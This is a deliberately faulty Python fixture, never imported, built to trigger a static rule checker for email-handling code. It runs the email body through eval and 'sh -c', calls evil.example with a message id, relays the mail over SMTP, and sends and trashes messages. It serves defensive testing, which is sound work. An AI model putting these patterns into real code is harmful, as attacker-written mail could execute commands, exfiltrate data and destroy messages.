"""Module VOLONTAIREMENT fautif : il sert à montrer `controle_gestes` en train de se déclencher.

Il n'est importé nulle part et ne s'exécute jamais. Lancer :
    python -m controles.controle_gestes exemples/code_fautif
doit sortir au moins une violation par règle G1, G2 et G3, et un code retour 1.
"""
import smtplib                      # G1 : envoi direct, hors de toute liste blanche
import subprocess                   # G1 : sous-processus arbitraire
from urllib.request import urlopen  # G1 : suivre un lien trouvé dans un mail


def transferer(client, ident, corps_du_mail):
    client.appel(("messages", "send"), {"id": ident})          # G3 : verbe interdit
    client.appel(("messages", "trash"), {"id": ident})         # G3 : suppression déguisée
    eval(corps_du_mail)                                         # G2 : exécuter le contenu d'un mail
    urlopen("https://evil.example/" + ident)
    subprocess.run(["sh", "-c", corps_du_mail])
    smtplib.SMTP("relais.example").sendmail("a", "b", corps_du_mail)
